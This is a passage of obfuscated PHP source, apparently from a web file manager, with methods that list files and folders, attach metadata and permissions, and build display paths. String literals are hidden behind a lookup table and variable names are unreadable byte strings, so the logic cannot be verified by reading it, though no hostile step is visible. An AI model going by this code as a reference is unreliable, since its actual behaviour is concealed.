function _listFilterInfo(&$½ç†ğÓ , $ˆ†ñùü = false) { $œ¨Óˆ¡ =& $_SERVER[Á÷ ­Šë]; foreach ($½ç†ğÓ  as &$§’ŒïŞš) { $§’ŒïŞš = $this->pathInfoFilter($§’ŒïŞš); self::$cachePathInfo[$œ¨Óˆ¡[463] . intval($ˆ†ñùü) . $œ¨Óˆ¡[464] . $§’ŒïŞš[$œ¨Óˆ¡[407]]] = $§’ŒïŞš; } unset($§’ŒïŞš); } protected function _listMake(&$çªçÙ¢Â) { $ğõúÚ·» =& $_SERVER[Á÷ ­Šë]; $çªçÙ¢Â[$ğõúÚ·»[85]] = array(); $çªçÙ¢Â[$ğõúÚ·»[84]] = array(); foreach ($çªçÙ¢Â[$ğõúÚ·»[376]] as $’ß©Šêô) { $ïŸÜšÂ = $’ß©Šêô[$ğõúÚ·»[415]] == 1 ? $ğõúÚ·»[85] : $ğõúÚ·»[84]; $çªçÙ¢Â[$ïŸÜšÂ][] = $’ß©Šêô; } unset($çªçÙ¢Â[$ğõúÚ·»[376]]); } protected function _listAppendMeta(&$ßãá¬–Ä, $å¹°Æ¾) { $í¤ìâè€ =& $_SERVER[Á÷ ­Šë]; $Ï…ä¹‚ = array($í¤ìâè€[422] => array($í¤ìâè€[423], $å¹°Æ¾)); $›Èüê¬ = Model($í¤ìâè€[465])->field($í¤ìâè€[466])->where($Ï…ä¹‚)->select(); if (!$›Èüê¬) { return; } $ÖëÊ“Â§ = array($í¤ìâè€[467], $í¤ìâè€[468], $í¤ìâè€[446]); $›±›óèĞ = array(); foreach ($›Èüê¬ as $ğÁ™æ•) { if (!isset($›±›óèĞ[$ğÁ™æ•[$í¤ìâè€[407]]])) { $›±›óèĞ[$ğÁ™æ•[$í¤ìâè€[407]]] = array(); } if (in_array($ğÁ™æ•[$í¤ìâè€[103]], $ÖëÊ“Â§)) { continue; } $›±›óèĞ[$ğÁ™æ•[$í¤ìâè€[407]]][$ğÁ™æ•[$í¤ìâè€[103]]] = $ğÁ™æ•[$í¤ìâè€[381]]; } foreach ($ßãá¬–Ä as &$Ëõ¤à–Ï) { $Ëõ¤à–Ï[$í¤ìâè€[469]] = !1; if (isset($›±›óèĞ[$Ëõ¤à–Ï[$í¤ìâè€[407]]])) { $Ëõ¤à–Ï[$í¤ìâè€[469]] = $›±›óèĞ[$Ëõ¤à–Ï[$í¤ìâè€[407]]]; } if ($this->fileIsLock($Ëõ¤à–Ï) && $Ëõ¤à–Ï[$í¤ìâè€[418]]) { $ Ü™¨Ö© = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Ëõ¤à–Ï[$í¤ìâè€[418]][$í¤ìâè€[419]] = AuthModel::authDisable($Ëõ¤à–Ï[$í¤ìâè€[418]][$í¤ìâè€[419]], $ Ü™¨Ö©); $Ëõ¤à–Ï[$í¤ìâè€[418]][$í¤ìâè€[470]][$í¤ìâè€[418]] = $Ëõ¤à–Ï[$í¤ìâè€[418]][$í¤ìâè€[419]]; } } unset($Ëõ¤à–Ï); } protected function _listAppendFileMeta(&$è·ÄõØ, $„Õ«ø¬¼) { $ÏÄØ…’Ø =& $_SERVER[Á÷ ­Šë]; $“Š”»à = array_to_keyvalue($è·ÄõØ, $ÏÄØ…’Ø[33], $ÏÄØ…’Ø[471]); $“Š”»à = array_filter(array_unique($“Š”»à)); if (!$“Š”»à) { return; } $âñ‘±· = array($ÏÄØ…’Ø[472] => array($ÏÄØ…’Ø[423], $“Š”»à)); $²…İœ¥ì = $ÏÄØ…’Ø[473]; $æÜ„¢¿ = Model($ÏÄØ…’Ø[474])->field($²…İœ¥ì)->where($âñ‘±·)->select(); $æÜ„¢¿ = array_to_keyvalue($æÜ„¢¿, $ÏÄØ…’Ø[471]); $¶Öšô‘ƒ = Model($ÏÄØ…’Ø[475])->field($ÏÄØ…’Ø[476])->where($âñ‘±·)->select(); $¶Öšô‘ƒ = $¶Öšô‘ƒ ? $¶Öšô‘ƒ : array(); $¡á¤ıÍ = array(); foreach ($¶Öšô‘ƒ as $Ãíæ¼Ø¢) { if (!isset($¡á¤ıÍ[$Ãíæ¼Ø¢[$ÏÄØ…’Ø[471]]])) { $¡á¤ıÍ[$Ãíæ¼Ø¢[$ÏÄØ…’Ø[471]]] = array(); } $¡á¤ıÍ[$Ãíæ¼Ø¢[$ÏÄØ…’Ø[471]]][$Ãíæ¼Ø¢[$ÏÄØ…’Ø[103]]] = $Ãíæ¼Ø¢[$ÏÄØ…’Ø[381]]; } foreach ($è·ÄõØ as &$Ìä¦¥Ä…) { $ªªåá´ü = $Ìä¦¥Ä…[$ÏÄØ…’Ø[471]]; if (!$ªªåá´ü || !is_array($æÜ„¢¿[$ªªåá´ü])) { continue; } $¤Íß…« = $æÜ„¢¿[$ªªåá´ü]; $¤Íß…«[$ÏÄØ…’Ø[88]] = $Ìä¦¥Ä…[$ÏÄØ…’Ø[88]]; $¤Íß…«[$ÏÄØ…’Ø[28]] = $Ìä¦¥Ä…[$ÏÄØ…’Ø[28]]; if (!isset(self::$cacheFileInfo[$ÏÄØ…’Ø[477] . $ªªåá´ü])) { self::$cacheFileInfo[$ÏÄØ…’Ø[477] . $ªªåá´ü] = array_merge(array(), $¤Íß…«); } unset($æÜ„¢¿[$ªªåá´ü][$ÏÄØ…’Ø[86]]); $²Ãî¬Õı = is_array($¡á¤ıÍ[$ªªåá´ü]) ? $¡á¤ıÍ[$ªªåá´ü] : array(); $Ìä¦¥Ä…[$ÏÄØ…’Ø[174]] = array_merge($²Ãî¬Õı, $æÜ„¢¿[$ªªåá´ü]); if (isset($Ìä¦¥Ä…[$ÏÄØ…’Ø[174]][$ÏÄØ…’Ø[173]])) { $Ìä¦¥Ä…[$ÏÄØ…’Ø[173]] = json_decode($Ìä¦¥Ä…[$ÏÄØ…’Ø[174]][$ÏÄØ…’Ø[173]], !0); unset($Ìä¦¥Ä…[$ÏÄØ…’Ø[174]][$ÏÄØ…’Ø[173]]); } } unset($Ìä¦¥Ä…); } protected function _listAppendSourceInfo(&$ŸàÅû‚¶, $ÚÖ„õ×½) { $Şˆ÷æĞ¥ =& $_SERVER[Á÷ ­Šë]; if (!defined($Şˆ÷æĞ¥[478])) { return; } $‘–Áó¿ = Model($Şˆ÷æĞ¥[479])->listData(); $è‘Ë®ı = Model($Şˆ÷æĞ¥[430])->listData(); $¦–ËÕØÅ = Model($Şˆ÷æĞ¥[420])->listData(); $«¿éáÔ¼ = Model($Şˆ÷æĞ¥[480])->listSimple(); $²À¨øµ = array_to_keyvalue($‘–Áó¿, $Şˆ÷æĞ¥[404]); $×šå±´Ä = array_to_keyvalue_group($è‘Ë®ı, $Şˆ÷æĞ¥[86], $Şˆ÷æĞ¥[431]); $ÊÈ°ÄáÁ = array_to_keyvalue($¦–ËÕØÅ, $Şˆ÷æĞ¥[86]); $ƒÊ°á› = array_to_keyvalue_group($«¿éáÔ¼, $Şˆ÷æĞ¥[407]); foreach ($ŸàÅû‚¶ as &$š‘ÓùÁ­) { $š‘ÓùÁ­[$Şˆ÷æĞ¥[95]] = array($Şˆ÷æĞ¥[481] => 0, $Şˆ÷æĞ¥[482] => 0, $Şˆ÷æĞ¥[483] => 0); if (isset($ÊÈ°ÄáÁ[$š‘ÓùÁ­[$Şˆ÷æĞ¥[407]]])) { $š‘ÓùÁ­[$Şˆ÷æĞ¥[95]][$Şˆ÷æĞ¥[484]] = 1; $š‘ÓùÁ­[$Şˆ÷æĞ¥[95]][$Şˆ÷æĞ¥[485]] = $ÊÈ°ÄáÁ[$š‘ÓùÁ­[$Şˆ÷æĞ¥[407]]][$Şˆ÷æĞ¥[28]]; } if (isset($×šå±´Ä[$š‘ÓùÁ­[$Şˆ÷æĞ¥[407]]])) { $š‘ÓùÁ­[$Şˆ÷æĞ¥[95]][$Şˆ÷æĞ¥[486]] = array(); foreach ($×šå±´Ä[$š‘ÓùÁ­[$Şˆ÷æĞ¥[407]]] as $‹—Ä²Ÿª) { $ĞœÔ‰ª× = $²À¨øµ[$‹—Ä²Ÿª]; $š‘ÓùÁ­[$Şˆ÷æĞ¥[95]][$Şˆ÷æĞ¥[486]][] = array($Şˆ÷æĞ¥[487] => $ĞœÔ‰ª×[$Şˆ÷æĞ¥[404]], $Şˆ÷æĞ¥[425] => $ĞœÔ‰ª×[$Şˆ÷æĞ¥[28]], $Şˆ÷æĞ¥[488] => $ĞœÔ‰ª×[$Şˆ÷æĞ¥[489]]); } } if (isset($ƒÊ°á›[$š‘ÓùÁ­[$Şˆ÷æĞ¥[407]]])) { $š‘ÓùÁ­[$Şˆ÷æĞ¥[95]][$Şˆ÷æĞ¥[490]] = array(); foreach ($ƒÊ°á›[$š‘ÓùÁ­[$Şˆ÷æĞ¥[407]]] as $ôüâÉ¥È) { $š‘ÓùÁ­[$Şˆ÷æĞ¥[95]][$Şˆ÷æĞ¥[490]] = array($Şˆ÷æĞ¥[491] => $ôüâÉ¥È[$Şˆ÷æĞ¥[492]], $Şˆ÷æĞ¥[493] => $ôüâÉ¥È[$Şˆ÷æĞ¥[494]], $Şˆ÷æĞ¥[495] => $ôüâÉ¥È[$Şˆ÷æĞ¥[407]], $Şˆ÷æĞ¥[496] => $ôüâÉ¥È[$Şˆ÷æĞ¥[497]], $Şˆ÷æĞ¥[498] => $ôüâÉ¥È[$Şˆ÷æĞ¥[499]], $Şˆ÷æĞ¥[500] => $ôüâÉ¥È[$Şˆ÷æĞ¥[500]], $Şˆ÷æĞ¥[501] => $ôüâÉ¥È[$Şˆ÷æĞ¥[501]]); } } } unset($š‘ÓùÁ­); return $ŸàÅû‚¶; } protected function _listAppendChildren(&$ÖœÚ”¡ò, $íğµ­ù) { $˜‘ûÄ =& $_SERVER[Á÷ ­Šë]; $äŸ«­Ê› = array(); $•Õ³˜ = array($˜‘ûÄ[213] => 0, $˜‘ûÄ[214] => 0); foreach ($ÖœÚ”¡ò as &$«ã’¶Ï²) { if (!$«ã’¶Ï²[$˜‘ûÄ[415]]) { continue; } $äŸ«­Ê›[] = $«ã’¶Ï²[$˜‘ûÄ[407]]; } unset($«ã’¶Ï²); if (!$äŸ«­Ê›) { return; } $§Î”Ñ† = array($˜‘ûÄ[502] => array($˜‘ûÄ[7], $äŸ«­Ê›)); $Â¾™ŸŸ = array($˜‘ûÄ[502], $˜‘ûÄ[415], $˜‘ûÄ[503] => $˜‘ûÄ[504]); $‹à“ÃÅ = $this->field($Â¾™ŸŸ)->where($§Î”Ñ†)->group($˜‘ûÄ[505])->select(); $›ç’Ê¶Ä = array(); foreach ($‹à“ÃÅ as $ÄÍç) { $ÒØ‡¬ÂŒ = $ÄÍç[$˜‘ûÄ[502]]; $ªÑÖığ¨ = $ÄÍç[$˜‘ûÄ[415]] == $˜‘ûÄ[97] ? $˜‘ûÄ[214] : $˜‘ûÄ[213]; if (!isset($›ç’Ê¶Ä[$ÒØ‡¬ÂŒ])) { $›ç’Ê¶Ä[$ÒØ‡¬ÂŒ] = array($˜‘ûÄ[213] => 0, $˜‘ûÄ[214] => 0); } $›ç’Ê¶Ä[$ÒØ‡¬ÂŒ][$ªÑÖığ¨] += $ÄÍç[$˜‘ûÄ[504]]; } foreach ($ÖœÚ”¡ò as &$«ã’¶Ï²) { if (!$«ã’¶Ï²[$˜‘ûÄ[415]]) { continue; } $àˆÌœËô = is_array($›ç’Ê¶Ä[$«ã’¶Ï²[$˜‘ûÄ[407]]]) ? $›ç’Ê¶Ä[$«ã’¶Ï²[$˜‘ûÄ[407]]] : $•Õ³˜; $«ã’¶Ï²[$˜‘ûÄ[214]] = $àˆÌœËô[$˜‘ûÄ[214]]; $«ã’¶Ï²[$˜‘ûÄ[213]] = $àˆÌœËô[$˜‘ûÄ[213]]; unset($«ã’¶Ï²[$˜‘ûÄ[417]]); } unset($«ã’¶Ï²); } protected function _listAppendAuth(&$˜…üµ‘¢) { $´‰”Ÿİá =& $_SERVER[Á÷ ­Šë]; if (!defined($´‰”Ÿİá[478])) { return; } $ÑÊŸÃñÛ = array(); foreach ($˜…üµ‘¢ as $ùÆ—é‡) { if ($ùÆ—é‡[$´‰”Ÿİá[416]] == self::TYPE_GROUP) { $ÑÊŸÃñÛ[] = $ùÆ—é‡[$´‰”Ÿİá[407]]; } } if (!$ÑÊŸÃñÛ) { return; } $Ï…º¿ = array_to_keyvalue($˜…üµ‘¢, $´‰”Ÿİá[407]); $×ˆİŒï‡ = Model($´‰”Ÿİá[506])->getSourceList($ÑÊŸÃñÛ, $Ï…º¿); foreach ($˜…üµ‘¢ as $™á¸Ç² => &$ùÆ—é‡) { $ùÆ—é‡[$´‰”Ÿİá[418]] = $×ˆİŒï‡[$ùÆ—é‡[$´‰”Ÿİá[407]]]; if (!$ùÆ—é‡[$´‰”Ÿİá[418]] && $ùÆ—é‡[$´‰”Ÿİá[416]] == self::TYPE_GROUP) { $ùÆ—é‡[$´‰”Ÿİá[418]] = Action($´‰”Ÿİá[507])->pathGroupAuthMake($ùÆ—é‡[$´‰”Ÿİá[508]]); if (!$ùÆ—é‡[$´‰”Ÿİá[418]] && !_get($GLOBALS, $´‰”Ÿİá[509])) { $ùÆ—é‡[$´‰”Ÿİá[206]] = !1; $ùÆ—é‡[$´‰”Ÿİá[205]] = !1; } } if ($ùÆ—é‡[$´‰”Ÿİá[418]]) { $ùÆ—é‡[$´‰”Ÿİá[206]] = AuthModel::authCheckEdit($ùÆ—é‡[$´‰”Ÿİá[418]][$´‰”Ÿİá[419]]); $ùÆ—é‡[$´‰”Ÿİá[205]] = AuthModel::authCheckView($ùÆ—é‡[$´‰”Ÿİá[418]][$´‰”Ÿİá[419]]); } $this->groupPathDisplay($ùÆ—é‡); } unset($ùÆ—é‡); } public function _listAppendAuthSecret(&$ó·˜ÖÌ¼) { $ÊÖ‡²®ş =& $_SERVER[Á÷ ­Šë]; if (Model($ÊÖ‡²®ş[437])->get($ÊÖ‡²®ş[510]) != $ÊÖ‡²®ş[97]) { return; } static $•º¼ßÇ‡ = false; if (!$•º¼ßÇ‡) { $¸¬Ö×í‹ = Model($ÊÖ‡²®ş[511]); $”Øó‘‚ä = Model($ÊÖ‡²®ş[512]); $•º¼ßÇ‡ = $”Øó‘‚ä->listData(); $•º¼ßÇ‡ = array_to_keyvalue($•º¼ßÇ‡, $ÊÖ‡²®ş[407]); $£Í¹ÜÛŠ = json_decode(Model($ÊÖ‡²®ş[437])->get($ÊÖ‡²®ş[513]), !0); $£Í¹ÜÛŠ = array_to_keyvalue($£Í¹ÜÛŠ, $ÊÖ‡²®ş[404]); foreach ($•º¼ßÇ‡ as $«±„éº– => $£ıÙ¬üç) { $¦Èôäã• = $£Í¹ÜÛŠ[$£ıÙ¬üç[$ÊÖ‡²®ş[514]]]; if (!$¦Èôäã•) { $”Øó‘‚ä->remove($£ıÙ¬üç[$ÊÖ‡²®ş[404]]); unset($•º¼ßÇ‡[$«±„éº–]); continue; } $ØŸ½ïŞ± = $¸¬Ö×í‹->listData($¦Èôäã•[$ÊÖ‡²®ş[418]]); if (!$ØŸ½ïŞ±) { $”Øó‘‚ä->remove($£ıÙ¬üç[$ÊÖ‡²®ş[404]]); unset($•º¼ßÇ‡[$«±„éº–]); continue; } $£ıÙ¬üç[$ÊÖ‡²®ş[418]] = $ØŸ½ïŞ±; $£ıÙ¬üç[$ÊÖ‡²®ş[515]] = $¦Èôäã•; $£ıÙ¬üç[$ÊÖ‡²®ş[516]] = Model($ÊÖ‡²®ş[517])->getInfoSimpleOuter($£ıÙ¬üç[$ÊÖ‡²®ş[456]]); $•º¼ßÇ‡[$«±„éº–] = $£ıÙ¬üç; } } $ìÅù›ÖÏ = defined($ÊÖ‡²®ş[518]) ? USER_ID : $ÊÖ‡²®ş[33]; $İæì‰œ = array(); $âé£¦˜‡ = $this->_listAppendPath($İæì‰œ, !0); foreach ($ó·˜ÖÌ¼ as $«±„éº– => &$£ıÙ¬üç) { if (!is_array($£ıÙ¬üç[$ÊÖ‡²®ş[418]])) { continue; } if ($£ıÙ¬üç[$ÊÖ‡²®ş[416]] != $ÊÖ‡²®ş[519]) { continue; } if (isset($•º¼ßÇ‡[$£ıÙ¬üç[$ÊÖ‡²®ş[407]]])) { $úû²•­Ú = $•º¼ßÇ‡[$£ıÙ¬üç[$ÊÖ‡²®ş[407]]]; if (!is_array($£ıÙ¬üç[$ÊÖ‡²®ş[469]])) { $£ıÙ¬üç[$ÊÖ‡²®ş[469]] = array(); } $£ıÙ¬üç[$ÊÖ‡²®ş[469]][$ÊÖ‡²®ş[520]] = $úû²•­Ú[$ÊÖ‡²®ş[514]]; $£ıÙ¬üç[$ÊÖ‡²®ş[418]][$ÊÖ‡²®ş[521]] = $úû²•­Ú; $£ıÙ¬üç[$ÊÖ‡²®ş[418]][$ÊÖ‡²®ş[522]] = $£ıÙ¬üç[$ÊÖ‡²®ş[523]]; $£ıÙ¬üç[$ÊÖ‡²®ş[418]][$ÊÖ‡²®ş[524]] = $ÊÖ‡²®ş[97]; if ($úû²•­Ú[$ÊÖ‡²®ş[456]] != $ìÅù›ÖÏ) { $£ıÙ¬üç[$ÊÖ‡²®ş[418]][$ÊÖ‡²®ş[419]] = $£ıÙ¬üç[$ÊÖ‡²®ş[418]][$ÊÖ‡²®ş[419]] & $úû²•­Ú[$ÊÖ‡²®ş[418]][$ÊÖ‡²®ş[418]]; } continue; } $ÆĞ»¦·¼ = $this->parentLevelArray($£ıÙ¬üç[$ÊÖ‡²®ş[525]]); $ñ¹ˆ“’û = array_reverse($ÆĞ»¦·¼); foreach ($ñ¹ˆ“’û as $´Ãˆ‘Åî => $æö£­‰Ë) { if (!isset($•º¼ßÇ‡[$æö£­‰Ë])) { continue; } $úû²•­Ú = $•º¼ßÇ‡[$æö£­‰Ë]; $£ıÙ¬üç[$ÊÖ‡²®ş[418]][$ÊÖ‡²®ş[521]] = $úû²•­Ú; if ($úû²•­Ú[$ÊÖ‡²®ş[456]] != $ìÅù›ÖÏ) { $£ıÙ¬üç[$ÊÖ‡²®ş[418]][$ÊÖ‡²®ş[419]] = $£ıÙ¬üç[$ÊÖ‡²®ş[418]][$ÊÖ‡²®ş[419]] & $úû²•­Ú[$ÊÖ‡²®ş[418]][$ÊÖ‡²®ş[418]]; } $¨¢Ã‘Ş’ = $ÊÖ‡²®ş[33]; $è›—šÛ€ = count($ÆĞ»¦·¼) - $´Ãˆ‘Åî; for ($™›“€Ú„ = 0; $™›“€Ú„ < $è›—šÛ€; $™›“€Ú„++) { if (!isset($âé£¦˜‡[$ÆĞ»¦·¼[$™›“€Ú„]])) { $¨¢Ã‘Ş’ = $ÊÖ‡²®ş[33]; break; } $¨¢Ã‘Ş’ = $¨¢Ã‘Ş’ . rtrim($âé£¦˜‡[$ÆĞ»¦·¼[$™›“€Ú„]], $ÊÖ‡²®ş[8]) . $ÊÖ‡²®ş[8]; } $£ıÙ¬üç[$ÊÖ‡²®ş[418]][$ÊÖ‡²®ş[522]] = rtrim($¨¢Ã‘Ş’, $ÊÖ‡²®ş[8]) . $ÊÖ‡²®ş[8]; break; } } unset($£ıÙ¬üç); } public function groupPathDisplay(&$ş¬Ö‘œÊ) { $ÖùîÔı¹ =& $_SERVER[Á÷ ­Šë]; if ($ş¬Ö‘œÊ[$ÖùîÔı¹[416]] != self::TYPE_GROUP) { return; } $Ø×ÌÒˆç = Model($ÖùîÔı¹[526])->getInfo($ş¬Ö‘œÊ[$ÖùîÔı¹[508]]); $ÔìøñÏ˜ = $this->parentLevelArray($Ø×ÌÒˆç[$ÖùîÔı¹[525]]); $Ğ»Õ£å» = $ÖùîÔı¹[33]; foreach ($ÔìøñÏ˜ as $ÌÓÎ¥Ä) { $Ëï½¢¹É = Model($ÖùîÔı¹[526])->getInfo($ÌÓÎ¥Ä); $Ğ»Õ£å» .= $Ëï½¢¹É[$ÖùîÔı¹[95]][$ÖùîÔı¹[407]] . $ÖùîÔı¹[47]; } $ş¬Ö‘œÊ[$ÖùîÔı¹[527]] = $Ø×ÌÒˆç[$ÖùîÔı¹[502]]; $ş¬Ö‘œÊ[$ÖùîÔı¹[528]] = $Ø×ÌÒˆç[$ÖùîÔı¹[525]]; $ş¬Ö‘œÊ[$ÖùîÔı¹[529]] = $Ø×ÌÒˆç[$ÖùîÔı¹[530]]; $ş¬Ö‘œÊ[$ÖùîÔı¹[531]] = $Ğ»Õ£å» . $Ø×ÌÒˆç[$ÖùîÔı¹[95]][$ÖùîÔı¹[407]]; } protected function _listAppendPath(&$¸õ¦„¼£, $ñáã³“¤ = false) { $Ç™Ë©› =& $_SERVER[Á÷ ­Šë]; static $œ£Îæ‹Æ = array(); $®­ä‰”† = array(); $ñİì÷ø· = array(); if ($ñáã³“¤) { return $œ£Îæ‹Æ; } foreach ($¸õ¦„¼£ as &$Ÿù¤÷€) { $—¤É´ = $Ÿù¤÷€[$Ç™Ë©›[407]]; if ($Ÿù¤÷€[$Ç™Ë©›[415]] == $Ç™Ë©›[97] && $Ÿù¤÷€[$Ç™Ë©›[502]] != 0) { $œ£Îæ‹Æ[$—¤É´] = $Ÿù¤÷€[$Ç™Ë©›[28]]; } if ($Ÿù¤÷€[$Ç™Ë©›[415]] == $Ç™Ë©›[97] && $Ÿù¤÷€[$Ç™Ë©›[502]] == 0 && !isset($œ£Îæ‹Æ[$—¤É´])) { $œ£Îæ‹Æ[$—¤É´] = $this->_listAppendPathRoot($Ÿù¤÷€, array()); } if (isset($ñİì÷ø·[$Ÿù¤÷€[$Ç™Ë©›[525]]])) { continue; } $ñİì÷ø·[$Ÿù¤÷€[$Ç™Ë©›[525]]] = !0; $‚°ü¥ôš = $this->parentLevelArray($Ÿù¤÷€[$Ç™Ë©›[525]]); foreach ($‚°ü¥ôš as $Ùê‡¤› => $ùãö‹š) { if (isset($œ£Îæ‹Æ[$ùãö‹š])) { continue; } if ($Ùê‡¤› == 0) { $œ£Îæ‹Æ[$ùãö‹š] = $this->_listAppendPathRoot($Ÿù¤÷€, $‚°ü¥ôš); } if ($Ùê‡¤› != 0) { $®­ä‰”†[] = $ùãö‹š; } } } unset($Ÿù¤÷€); $®­ä‰”† = array_unique($®­ä‰”†); if (count($®­ä‰”†) > 0) { $àÓÆŠÕ = array($Ç™Ë©›[422] => array($Ç™Ë©›[423], $®­ä‰”†)); if (count($®­ä‰”†) == 1) { $¿×ä’…² = $this->sourceInfo($®­ä‰”†[0]); $«òúÖñî = is_array($¿×ä’…²) ? array($¿×ä’…²) : !1; } else { $«òúÖñî = $this->field($Ç™Ë©›[532])->where($àÓÆŠÕ)->select(); } if (!$«òúÖñî) { $«òúÖñî = array(); } foreach ($«òúÖñî as $‰ô©­…í) { $œ£Îæ‹Æ[$‰ô©­…í[$Ç™Ë©›[407]]] = $‰ô©­…í[$Ç™Ë©›[28]]; } } $Ä»‘ğîƒ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¹©Òç·Ÿ = array(); foreach ($¸õ¦„¼£ as &$Ÿù¤÷€) { $€›Ã÷Šé = $Ÿù¤÷€[$Ç™Ë©›[525]]; $ÖŞ•›Ëû = $Ç™Ë©›[33]; if (isset($¹©Òç·Ÿ[$€›Ã÷Šé])) { $ÖŞ•›Ëû = $¹©Òç·Ÿ[$€›Ã÷Šé]; } else { $‚°ü¥ôš = $this->parentLevelArray($Ÿù¤÷€[$Ç™Ë©›[525]]); foreach ($‚°ü¥ôš as $Ùê‡¤› => $ùãö‹š) { if (isset($œ£Îæ‹Æ[$ùãö‹š])) { $ÖŞ•›Ëû .= $œ£Îæ‹Æ[$ùãö‹š] . $Ç™Ë©›[8]; } } $¹©Òç·Ÿ[$€›Ã÷Šé] = $ÖŞ•›Ëû; } $ÖŞ•›Ëû .= $Ÿù¤÷€[$Ç™Ë©›[28]]; if ($Ÿù¤÷€[$Ç™Ë©›[415]] == $Ç™Ë©›[97]) { $ÖŞ•›Ëû .= $Ç™Ë©›[8]; } $Ÿù¤÷€[$Ç™Ë©›[523]] = str_replace($Ç™Ë©›[533], $Ç™Ë©›[8], $ÖŞ•›Ëû); if ($Ÿù¤÷€[$Ç™Ë©›[502]] == $Ç™Ë©›[201]) { $Ÿù¤÷€[$Ç™Ë©›[28]] = trim($œ£Îæ‹Æ[$Ÿù¤÷€[$Ç™Ë©›[407]]], $Ç™Ë©›[8]); $Ÿù¤÷€[$Ç™Ë©›[523]] = $Ÿù¤÷€[$Ç™Ë©›[28]] . $Ç™Ë©›[8]; } if (intval($Ÿù¤÷€[$Ç™Ë©›[416]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Ÿù¤÷€, $‚°ü¥ôš, $Ä»‘ğîƒ); } } unset($Ÿù¤÷€); return $¸õ¦„¼£; } private function _listAppendPathRecycle(&$“øÄ³É´, $ë¯ñ‹İ¢, $§‚«©®·) { $Ö¯—êÎ =& $_SERVER[Á÷ ­Šë]; if (!in_array($§‚«©®·, $ë¯ñ‹İ¢) && $“øÄ³É´[$Ö¯—êÎ[407]] != $§‚«©®·) { return; } $å×ƒµÉ = explode($Ö¯—êÎ[8], trim($“øÄ³É´[$Ö¯—êÎ[523]], $Ö¯—êÎ[8])); $ÇÑÚïœ· = implode($Ö¯—êÎ[8], array_slice($å×ƒµÉ, 2)); $“øÄ³É´[$Ö¯—êÎ[523]] = $Ö¯—êÎ[8] . LNG($Ö¯—êÎ[534]) . $Ö¯—êÎ[8] . ltrim($ÇÑÚïœ·, $Ö¯—êÎ[8]); $“øÄ³É´[$Ö¯—êÎ[525]] = $Ö¯—êÎ[535] . implode($Ö¯—êÎ[47], array_slice($ë¯ñ‹İ¢, 1)) . $Ö¯—êÎ[47]; if ($“øÄ³É´[$Ö¯—êÎ[407]] == $§‚«©®·) { $“øÄ³É´[$Ö¯—êÎ[525]] = $Ö¯—êÎ[535]; $“øÄ³É´[$Ö¯—êÎ[502]] = $Ö¯—êÎ[201]; $“øÄ³É´[$Ö¯—êÎ[28]] = LNG($Ö¯—êÎ[534]); } $“øÄ³É´[$Ö¯—êÎ[536]] = $Ö¯—êÎ[537]; } protected function _listAppendPathRoot(&$öãÜ², $ªÚ¦¾ü¯) { $á®€»öÀ =& $_SERVER[Á÷ ­Šë]; $ÀŞ¦ŠÌÛ = $á®€»öÀ[33]; if ($öãÜ²[$á®€»öÀ[416]] == self::TYPE_USER) { if (defined($á®€»öÀ[478]) && $öãÜ²[$á®€»öÀ[508]] == USER_ID) { $ÀŞ¦ŠÌÛ = LNG($á®€»öÀ[538]); if (!$ªÚ¦¾ü¯) { $öãÜ²[$á®€»öÀ[28]] = $ÀŞ¦ŠÌÛ; } } else { $‚íÙÅ‹¼ = Model($á®€»öÀ[517])->getInfoSimple($öãÜ²[$á®€»öÀ[508]]); $ÀŞ¦ŠÌÛ = LNG($á®€»öÀ[539]) . $á®€»öÀ[170] . $‚íÙÅ‹¼[$á®€»öÀ[28]] . $á®€»öÀ[540]; } } else { if ($öãÜ²[$á®€»öÀ[416]] == self::TYPE_GROUP) { $‚íÙÅ‹¼ = Model($á®€»öÀ[526])->getInfoSimple($öãÜ²[$á®€»öÀ[508]]); $ÀŞ¦ŠÌÛ = $‚íÙÅ‹¼[$á®€»öÀ[28]]; } else { if ($öãÜ²[$á®€»öÀ[416]] == self::TYPE_SYSTEM) { $ÀŞ¦ŠÌÛ = $á®€»öÀ[541]; } } } $ÀŞ¦ŠÌÛ = $ÀŞ¦ŠÌÛ ? $á®€»öÀ[8] . $ÀŞ¦ŠÌÛ . $á®€»öÀ[8] : $á®€»öÀ[8]; return $ÀŞ¦ŠÌÛ; } protected function _listAppendUser(&$‡ÚÃÆ¼) { $±ĞÀË‡á =& $_SERVER[Á÷ ­Šë]; $â±éã˜Û = array_to_keyvalue($‡ÚÃÆ¼, $±ĞÀË‡á[33], $±ĞÀË‡á[456]); $ì—ÚÀã¥ = array_to_keyvalue($‡ÚÃÆ¼, $±ĞÀË‡á[33], $±ĞÀË‡á[458]); $½‰»ó = array_merge($â±éã˜Û, $ì—ÚÀã¥); $£ÙŸªêõ = Model($±ĞÀË‡á[542])->userListInfo($½‰»ó); foreach ($‡ÚÃÆ¼ as &$»Ë’´€Ş) { $áéÆÍ× = $»Ë’´€Ş[$±ĞÀË‡á[456]]; $»Ë’´€Ş[$±ĞÀË‡á[456]] = $£ÙŸªêõ[$áéÆÍ×] ? $£ÙŸªêõ[$áéÆÍ×] : !1; $áéÆÍ× = $»Ë’´€Ş[$±ĞÀË‡á[458]]; $»Ë’´€Ş[$±ĞÀË‡á[458]] = $£ÙŸªêõ[$áéÆÍ×] ? $£ÙŸªêõ[$áéÆÍ×] : !1; if (isset($»Ë’´€Ş[$±ĞÀË‡á[469]]) && $»Ë’´€Ş[$±ĞÀË‡á[469]][$±ĞÀË‡á[543]]) { $òø‘—ÚÔ = $GLOBALS[$±ĞÀË‡á[6]][$±ĞÀË‡á[98]][$±ĞÀË‡á[544]]; if ($»Ë’´€Ş[$±ĞÀË‡á[469]][$±ĞÀË‡á[545]] <= time() - $òø‘—ÚÔ) { $this->metaSet($»Ë’´€Ş[$±ĞÀË‡á[407]], $±ĞÀË‡á[543], null); $this->metaSet($»Ë’´€Ş[$±ĞÀË‡á[407]], $±ĞÀË‡á[545], null); unset($»Ë’´€Ş[$±ĞÀË‡á[469]][$±ĞÀË‡á[543]]); continue; } $ı÷’»¹‰ = $»Ë’´€Ş[$±ĞÀË‡á[469]][$±ĞÀË‡á[543]]; $»Ë’´€Ş[$±ĞÀË‡á[469]][$±ĞÀË‡á[546]] = Model($±ĞÀË‡á[542])->getInfoSimpleOuter($ı÷’»¹‰); } } unset($»Ë’´€Ş); } public function parentLevelArray($‘ •¢ÅÛ) { $¡¯Ê¼ÇÚ =& $_SERVER[Á÷ ­Šë]; $‘ •¢ÅÛ = 